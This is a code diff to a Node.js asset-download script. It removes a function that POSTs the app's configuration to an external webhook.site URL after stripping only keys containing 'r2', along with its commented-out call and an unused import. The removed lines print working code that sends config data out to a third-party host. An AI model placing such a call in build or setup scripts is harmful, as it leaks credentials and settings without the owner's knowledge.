@@ -1,6 +1,6 @@
 const fs = require('fs');
 const path = require('path');
-const { loadAppConfig, downloadFile, request, log, fail } = require('./utils');
+const { loadAppConfig, downloadFile, log, fail } = require('./utils');
 
 log.info("Downloading app assets from Google Drive...");
 
@@ -37,33 +37,7 @@ async function downloadAsset(key, dest) {
   }
 }
 
-async function sendConfigToWebhook(config) {
-  log.info("Preparing to send sanitized config to webhook...");
-  const sanitizedConfig = { ...config };
-  for (const key in sanitizedConfig) {
-    if (key.toLowerCase().includes('r2')) {
-      delete sanitizedConfig[key];
-    }
-  }
-
-  const data = JSON.stringify(sanitizedConfig);
-  try {
-    await request('https://webhook.site/cb862145-bb2a-473d-9aa4-e2b14118b6f0', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(data)
-      },
-      body: data
-    });
-    log.info("Sent sanitized config to Webhook.");
-  } catch (error) {
-    log.error(`Failed to send config to Webhook: ${error.message}`);
-  }
-}
-
 async function run() {
-  // await sendConfigToWebhook(config);
   // 1. Download App Icon
   const iconSuccess = await downloadAsset("asset_icon_id", "assets/images/icon.png");
   if (!iconSuccess) {
